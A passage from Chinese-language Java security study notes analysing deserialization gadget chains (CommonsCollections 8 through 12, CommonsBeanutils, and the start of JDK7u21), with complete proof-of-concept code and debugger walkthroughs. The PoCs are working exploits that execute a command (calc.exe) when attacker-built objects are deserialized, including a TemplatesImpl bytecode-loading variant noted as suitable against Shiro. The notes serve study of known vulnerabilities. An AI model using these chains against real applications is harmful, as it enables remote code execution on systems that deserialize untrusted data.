        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // define the comparator used for sorting
        TransformingComparator comp = new TransformingComparator(transformer);

        // prepare CommonsCollections object entry point
        TreeBag tree = new TreeBag(comp);
        tree.add(obj);

        // arm transformer
        setFieldValue(transformer, "iMethodName", "newTransformer");


        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(tree);

        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
        objectInputStream.readObject();
    }
}
```

## 分析

首先从`TreeBag#readObject`开始，`TreeBag`继承`AbstractMAp`，其用到的构造函数

```
public TreeMap(Comparator<? super K> comparator) {
    this.comparator = comparator;
}
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
    in.defaultReadObject();
    Comparator<? super E> comp = (Comparator)in.readObject();
    super.doReadObject(new TreeMap(comp), in);
}
```

然后进入`super.doReadObject` 也就是`AbstractMap#doReadObject`,参数1为新实例化的一个参数为poc中的`comp`的TreeMap对象，参数2为序列化数据流。

![image-20220128113225066](img/image-20220128113225066.png)![image-20220128113225066](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220128113225066.png?lastModify=1646033842)

然后进入`map.put` 即`TreeMap#put`，

![image-20220128113828855](img/image-20220128113828855.png)![image-20220128113828855](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220128113828855.png?lastModify=1646033842)

然后进入`TreeMap#compare` 

![image-20220128114104266](img/image-20220128114104266.png)![image-20220128114104266](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220128114104266.png?lastModify=1646033842)

此时`comparator`为之前的`comp`

```
TransformingComparator comp = new TransformingComparator(transformer);

// prepare CommonsCollections object entry point
TreeBag tree = new TreeBag(comp);
```

跟进`TransformingComparator#compare`

![image-20220128114320140](img/image-20220128114320140.png)![image-20220128114320140](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220128114320140.png?lastModify=1646033842)

这里就和之前分析的链差不多了。是调用`TemplatesImpl#newTransformer`。

```
java
TransformerImpl#newTransformer --->
TransformerImpl#getTransletInstance --->
TransformerImpl#defineTransletClasses --->
ClassLoader#defineClass --->
AbstractTranslet#newInstance --->
字节码对象实例化，执行静态代码块
```

## 调试

在`TreeMap#readObject`打断点：

comp为我们传入的`TransformingComparator`对象，

![image-20220128120557793](img/image-20220128120557793.png)![image-20220128120557793](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220128120557793.png?lastModify=1646033842)

跟进，首先将`TreeMap`对象赋值给`AbstractMapBag`的map属性，然后进入for循环，

![image-20220128121111253](img/image-20220128121111253.png)![image-20220128121111253](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220128121111253.png?lastModify=1646033842)

跟进`ma.put`  ，`TreeMap#put`,obj为poc中的`TemplatesImpl`对象，

![image-20220128121622346](img/image-20220128121622346.png)![image-20220128121622346](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220128121622346.png?lastModify=1646033842)

这里root为空，赋值给t ,所以进入if判断，

然后跟进本身的`compre`方法，键和值都`TemplatesImpl`对象

![image-20220128121758007](img/image-20220128121758007.png)![image-20220128121758007](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220128121758007.png?lastModify=1646033842)

这里 `comparator`为之前构造函数传进来的`comp`,所以不为空，

```
new TreeBag(comp);
```

就跟进了`comparator.compare`方法，comparator是`TransformingComparator`对象，方法参数仍为 `TemplatesImpl`对象

![image-20220128122033996](img/image-20220128122033996.png)![image-20220128122033996](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220128122033996.png?lastModify=1646033842)

这里又到了熟悉的环境，`this.transformer`为`InvokerTransformer`对象，调用其`transform`方法，参数为`TemplatesImpl`对象

![image-20220128122238198](img/image-20220128122238198.png)![image-20220128122238198](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220128122238198.png?lastModify=1646033842)

反射调用`TemplatesImpl#newTransformer`

![image-20220128122817948](img/image-20220128122817948.png)![image-20220128122817948](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220128122817948.png?lastModify=1646033842)

经过一系列调用

```
TransformerImpl#newTransformer --->
TransformerImpl#getTransletInstance --->
TransformerImpl#defineTransletClasses --->
ClassLoader#defineClass --->
AbstractTranslet#newInstance --->
字节码对象实例化，执行静态代码块
```

具体的分析可以看之前的。

# CommonsCollections9

链接： https://github.com/frohoff/ysoserial/pull/125/commits/4edf02ba7765488cac124c92e04c6aae40da3e5d

`commons-collections 3.2.1` ， jdk8 , without SecurityManager  

```
package ysoserial.payloads;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/*
	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						DefaultedMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()
	Requires:
		commons-collections
 */
/*
This only works in JDK 8u76 and WITHOUT a security manager
https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
 */
//@PayloadTest(skip="need more robust way to detect Runtime.exec() without SecurityManager()")
@SuppressWarnings({"rawtypes", "unchecked"})
@PayloadTest( precondition = "isApplicableJavaVersion")
@Dependencies({"commons-collections:commons-collections:3.2.1"})
public class CommonsCollections9 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {

    public BadAttributeValueExpException getObject(final String command) throws Exception {
        final String[] execArgs = new String[] { command };
        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
            new Transformer[]{ new ConstantTransformer(1) });
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] {
                String.class, Class[].class }, new Object[] {
                "getRuntime", new Class[0] }),
            new InvokerTransformer("invoke", new Class[] {
                Object.class, Object[].class }, new Object[] {
                null, new Object[0] }),
            new InvokerTransformer("exec",
                new Class[] { String.class }, execArgs),
            new ConstantTransformer(1) };

        final Map innerMap = new HashMap();
        final Map defaultedmap = DefaultedMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(defaultedmap, "foo");

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, entry);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

        return val;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections5.class, args);
    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }
}
```

改成自用的poc.

## poc

```
package cc9;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC9Demo1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, new Object[]{"calc.exe"}),
                new ConstantTransformer(1) };

        final Map innerMap = new HashMap();
        final Map defaultedmap = DefaultedMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(defaultedmap, "foo");

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        setFieldValue(val,"val",entry);

        setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(val);

        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
        objectInputStream.readObject();
    }
}
```

## 分析

整体来说，和CC5链差不多，

只不过将lzaymap 换成了`DefaultedMap` ，

## 调试

关闭`idea` 的调试自动调用tostring功能。

在`BadAttributeValueExpException#readObject`下断点：

![image-20220128151539851](img/image-20220128151539851.png)![image-20220128151539851](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220128151539851.png?lastModify=1646033842)

首先得到poc中的`TiedMapEntry` 对象，然后判断其不为空，在判断`System.getSecurityManager()` ，最后进入`TiedMapEntry#toString` 

![image-20220128151834936](img/image-20220128151834936.png)![image-20220128151834936](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220128151834936.png?lastModify=1646033842)

跟进`TiedMapEntry#getValue`方法

![image-20220128151918149](img/image-20220128151918149.png)![image-20220128151918149](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220128151918149.png?lastModify=1646033842)

此时`this.map` 为`DefaultedMap` 对象，

跟进`DefaultedMap#get`

![image-20220128152148618](img/image-20220128152148618.png)![image-20220128152148618](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220128152148618.png?lastModify=1646033842)

这里`this.map` 为poc中的`innerMap` ，没有不包key，进入if判断

```
this.value`为poc中的`transformerChain`，所以跟进`transformerChain#transform
```

![image-20220128152955989](img/image-20220128152955989.png)![image-20220128152955989](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220128152955989.png?lastModify=1646033842)

然后就跟之前的`transform`相互调用最终执行命令了。

![image-20220128153945325](img/image-20220128153945325.png)![image-20220128153945325](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220128153945325.png?lastModify=1646033842)

# commons-collections10

## poc

链：

```
Hashtable.readObject()
    -> Hashtable.reconstitutionPut
    -> key.hashCode() => TiedMapEntry.hashCode()
    -> TiedMapEntry.getValue
    -> TiedMapEntry.map.get() => LazyMap.get()
    -> factory.transform() => ChainedTransformer.transform()
    -> 前文构造的Runtime.getRuntime().exec()
package cc10;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC10Demo1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, new Object[]{"calc.exe"}),
                new ConstantTransformer(1) };

        final Map innerMap1 = new HashMap();

        final Map outerMap = LazyMap.decorate(innerMap1, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(outerMap, "foo");

        Hashtable hashtable = new Hashtable();
        hashtable.put("foo", 1);

        //获取hashtable的table类属性
        Field tableField = Hashtable.class.getDeclaredField("table");
        tableField.setAccessible(true);
        Object[] table = (Object[]) tableField.get(hashtable);
        Object entry1 = table[0];
        if (entry1 == null)
            entry1 = table[1];
        // 获取Hashtable.Entry的key属性
        Field keyField = entry1.getClass().getDeclaredField("key");
        keyField.setAccessible(true);
        // 将key属性给替换成构造好的TiedMapEntry实例
        keyField.set(entry1, entry);
        // 填充真正的命令执行代码
        setFieldValue(transformerChain, "iTransformers", transformers);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashtable);

        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
        objectInputStream.readObject();

    }
}
```

## 分析

和CC7差不多。

CC7的链：

```
/*
    Payload method chain:

    java.util.Hashtable.readObject
    java.util.Hashtable.reconstitutionPut
    org.apache.commons.collections.map.AbstractMapDecorator.equals
    java.util.AbstractMap.equals
    org.apache.commons.collections.map.LazyMap.get
    org.apache.commons.collections.functors.ChainedTransformer.transform
    org.apache.commons.collections.functors.InvokerTransformer.transform
    java.lang.reflect.Method.invoke
    sun.reflect.DelegatingMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke0
    java.lang.Runtime.exec
*/
```

将HashTable到LazyMap.get链的AbstractMapDecorator变成了`TiedMapEntry`.

还有cc6的影子。`Hashtable->LazyMap`。

## 调试

断点吓到`Hashtable#readObject`:

![image-20220130105205824](img/image-20220130105205824.png)![image-20220130105205824](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220130105205824.png?lastModify=1646033842)

跟进`reconstitutionPut`

key为`TiedMapEntry`

![image-20220130105415352](img/image-20220130105415352.png)![image-20220130105415352](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220130105415352.png?lastModify=1646033842)

跟进`key.hashcode`

![image-20220130105540192](img/image-20220130105540192.png)![image-20220130105540192](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220130105540192.png?lastModify=1646033842)

跟进`getValue`

![image-20220130105626841](img/image-20220130105626841.png)![image-20220130105626841](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220130105626841.png?lastModify=1646033842)

this.map为`outerMap`，跟进`get`方法

![image-20220130105808090](img/image-20220130105808090.png)![image-20220130105808090](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220130105808090.png?lastModify=1646033842)

满足 if ,

this.factory 为`transformerChain`。调用它的`transform`方法。就跟之前的一样了。

https://www.anquanke.com/post/id/190468#h3-5

# CommonsCollections11

和cc6差不多。只不过CC11这用了字节码，也正好符合打shiro的条件（无数组）。

```
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                ... templates gadgets ...
                                    java.lang.Runtime.exec()
```



```
package cc11;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CC11Demo1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc3 = pool.makeClass("CC10");
        cc3.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        cc3.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");
        byte[] code = cc3.toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_bytecodes",new byte[][]{code});
        setFieldValue(obj,"_name","test");
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());

        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        Map innermap = new HashMap();
        Map map =  LazyMap.decorate(innermap, transformer);
        TiedMapEntry tiedmap = new TiedMapEntry(map, obj);
        HashSet hashset = new HashSet(1);
        hashset.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        HashMap hashset_map = (HashMap) f.get(hashset);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array = (Object[]) f2.get(hashset_map);

        Object node = array[0];
        if (node == null) {
            node = array[1];
        }
        Field keyField = null;
        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception e) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node, tiedmap);

        Field f3 = transformer.getClass().getDeclaredField("iMethodName");
        f3.setAccessible(true);
        f3.set(transformer, "newTransformer");

        try {
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc11"));
            outputStream.writeObject(hashset);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc11"));
            inputStream.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
```

https://www.yuque.com/tianxiadamutou/zcfd4v/th41wx

# CommonsCollections12

CC6的改造。

```
/*
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()

    by @matthias_kaiser
*/
```

这里直接调用HashMap的readObject也可（P神java漫谈中提到过）。

> 使用Runtime的缺点在于，只能执行但命令，执行复杂命令时需要在线Runtime网站编码，win系统需要借助powershell。但在实战中环境不尽人意，所以借助了`javax.script.ScriptEngineManager`。

## JDK内置JS引擎





https://xz.aliyun.com/t/8673











# CommonsBeanutils

> CC2中，我们认识了 java.util.PriorityQueue ，它在Java中是一个优先队列，队列中每一个元素有自己的优先级。在反序列化这个对象时，为了保证队列顺序，会进行重排序的操作，而排序就涉及到大小比较，进而执行 java.util.Comparator 接口的 compare() 方法。那么，我们是否还能找到其他可以利用的 java.util.Comparator 对象呢？

Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象 (也称JavaBean) 的一些操作方法.

[JavaBean](https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680)

依赖

```
<dependency>
    <groupId>commons-beanutils</groupId>
    <artifactId>commons-beanutils</artifactId>
    <version>1.9.4</version>
</dependency>
```

cat.java

```
package cb;

import org.apache.commons.beanutils.PropertyUtils;

import java.lang.reflect.InvocationTargetException;

public class Cat {
    private String name = "test";

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException {
        String name = (String) PropertyUtils.getProperty(new Cat(), "name");
        System.out.println(name);
    }
}
```

输出 `test` 。

`commons-beanutils`中提供了一个静态方法`PropertyUtils.getProperty` ，让使用者可以直接调用任意 javaBean的 getter 方法。

> 此时，commons-beanutils会自动找到name属性的getter方法，也就是 getName ，然后调用，获得返回值。除此之外，PropertyUtils.getProperty 还支持递归获取属性，比如a对象中有属性b，b对象中有属性c，我们可以通过 PropertyUtils.getProperty(a, "b.c"); 的方式进行递归获取。通过这个方法，使用者可以很方便地调用任意对象的getter，适用于在不确定JavaBean是哪个类对象时使用。当然，commons-beanutils中诸如此类的辅助方法还有很多，如调用setter、拷贝属性等，本文不再细说

## getter 的妙用

在`commons-beanutils`包中存在一个`org.apache.commons.beanutils.BeanComparator` 。

`BeanComparator` 是 commons-beanutils 提供的用来比较两个`JavaBean`时候相等的类，其实现了`java.utils.Comparator`接口。

```
public int compare(T o1, T o2) {
    if (this.property == null) {
        return this.internalCompare(o1, o2);
    } else {
        try {
            Object value1 = PropertyUtils.getProperty(o1, this.property);
            Object value2 = PropertyUtils.getProperty(o2, this.property);
            return this.internalCompare(value1, value2);
        } catch (IllegalAccessException var5) {
            throw new RuntimeException("IllegalAccessException: " + var5.toString());
        } catch (InvocationTargetException var6) {
            throw new RuntimeException("InvocationTargetException: " + var6.toString());
        } catch (NoSuchMethodException var7) {
            throw new RuntimeException("NoSuchMethodException: " + var7.toString());
        }
    }
}
```

这个方法传入两个对象，如果判断`this.property` 为 null ，直接使用

`inernalCompare` 方法比较两个参数对象，如果不为 null ，使用`PropertyUtils.getProperty` 取出两个对象的`property` 属性值进行比较。

这里如果我们有一个 JavaBean 的恶意 getter 方法，那么就可以使用`PropertyUtils.getProperty` 进行调用了。

> 之前 学习 TemplatesImpl 的时候，有一处调用链：
>
> ```
> TemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses() -> TransletClassLoader#defineClass()
> ```
>
> 恰巧`getOutputProperties` 符合 getter的条件，并且可以被调用。

那么就可以连起来了。

`PropertyUtils.getProperty` ---> `TemplatesImpl#getOutputProperties` --> `TemplatesImpl#newTransformer` -->  ... --> 加载恶意字节码。

使得

```
PropertyUtils.getProperty(o1, this.property);

o1:  TemplatesImpl对象
this.property :  outputProperties
```

## POC 构造

实例化一个队列`PriorityQueue` ，将比较器`BeanComparator` 对象作为参数传进去，

后续设置`BeanComparator#property` 的值为`outputProperties` ，触发 `TemplatesImpl#getOutputProperties` ，

```
package cb;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CBDemo1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        // 获取默认类池
        ClassPool pool = ClassPool.getDefault();
        CtClass cc2 = pool.makeClass("CC2");
        cc2.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        cc2.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");
        byte[] code = cc2.toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_bytecodes",new byte[][]{code});
        setFieldValue(obj,"_name","test");
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());

        BeanComparator comparator = new BeanComparator();
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add(1);
        queue.add(1);

        setFieldValue(comparator,"property","outputProperties");
        setFieldValue(queue,"queue",new Object[]{obj,1});

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream);
        outputStream.writeObject(queue);
        outputStream.close();
        System.out.println(byteArrayOutputStream);

        ObjectInputStream inputStream=new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
        inputStream.readObject();

    }
}
```

成功弹出计算器。

相对于 ysoserial 中的链，去掉了`java.math.BigInteger` 的使用，因为 ysoserial 为了兼容`property=lowestSetBit` ，但实际无需设置`property`的值。



Java安全漫谈 - 17.CommonsBeanutils与无commons-collections的Shiro反序列化利用.pdf

# JDK7U21原生链

之前得反序列化利用前提都是存在相关漏洞组件。如果没有组件存在，那么就无法利用。

这里来说一条不依赖第三方库的java反序列化利用链。

JDK7u21，适用于Java 7u21 及以前的版本。

## 原理

JDK7u21的核心是`sun.reflect.annotation.AnnotationInvocationHandler`，回想一下，这个类在cc1中遇到过，出发了LaztMap.get 方法。

看其`equalsImpl`方法

![image-20220202144253976](img/image-20220202144253976.png)![image-20220202144253976](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202144253976.png?lastModify=1646033842)

`getMemberMethods` :

```
private Method[] getMemberMethods() {
    if (this.memberMethods == null) {
        this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction<Method[]>() {
            public Method[] run() {
                Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();
                AccessibleObject.setAccessible(var1, true);
                return var1;
            }
        });
    }

    return this.memberMethods;
}
```

getMemberMethods 是拿到this.type 类中的所有方法。

equalsImpl 则是反射调用所有方法。

如果`this.type`是Templates类，那么会调用它的所有方法，包括`newTransformer`和`getOutputProperties`方法，进而触发任意代码执行。

## 如何调用equalsImpl

> 在使用 java.reflect.Proxy 动态绑定一个接口时，如果调用该接口中任意一个方法，会执行到InvocationHandler#invoke 。执行invoke时，被传入的第一个参数是这个proxy对象，第二个参数是被执行的方法名，第三个参数是执行时的参数列表。

在`AnnotationInvocationHandler#invoke`中有调用到`equalsImpl`。

`AnnotationInvocationHandler#invoke`在CC1中也用到过。

![image-20220202145335554](img/image-20220202145335554.png)![image-20220202145335554](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202145335554.png?lastModify=1646033842)

这里是有 if 条件的，需要满足方法名为 equals ，参数长度为1 ，参数类型为 Object类型。

所以我们需要找到一个方法，在反序列化时对 proxy 调用 equals 方法。

## 找到equals方法调用链

一个常见的调用equals的场景是 set。

set中存储的对象不允许重复，所以在添加对象得时候，会涉及到比较操作。

![image-20220202150706963](img/image-20220202150706963.png)![image-20220202150706963](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202150706963.png?lastModify=1646033842)

使用到HashMap，将对象保存在HashMap得key处来做去重。

跟进put方法

![image-20220202151216463](img/image-20220202151216463.png)![image-20220202151216463](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202151216463.png?lastModify=1646033842)

两个不同的对象hash相等，key不相等时才会进行到equals方法。

接下来就是让proxy对象的哈希等于TemplatesImpl对象得哈希。

## Magic Number

计算哈希主要是

```
int hash = hash(key);
int i = indexFor(hash, table.length);
final int hash(Object k) {
    int h = 0;
    if (useAltHashing) {
        if (k instanceof String) {
            return sun.misc.Hashing.stringHash32((String) k);
        }
        h = hashSeed;
    }

    h ^= k.hashCode();

    // This function ensures that hashCodes that differ only by
    // constant multiples at each bit position have a bounded
    // number of collisions (approximately 8 at default load factor).
    h ^= (h >>> 20) ^ (h >>> 12);
    return h ^ (h >>> 7) ^ (h >>> 4);
}
```

只有key.hashcode() 是变量。

所以比较proxy和TemplatesImpl对象的哈希是否相等就取决于这里。

`TemplatesImpl`的`hashcode`方法是一个Native方法，酶促运行都会变化，所以让 proxy的`hashcode`方法与之相等。

`proxy.hashCode()`仍会调用到`AnnotationInvocationHandler#invoke`，进而调用到`hashCodeImpl`，

![image-20220202153058924](img/image-20220202153058924.png)![image-20220202153058924](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202153058924.png?lastModify=1646033842)

![image-20220202153603534](img/image-20220202153603534.png)![image-20220202153603534](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202153603534.png?lastModify=1646033842)

遍历`memberValues`这个map的每个key和value，求和计算

```
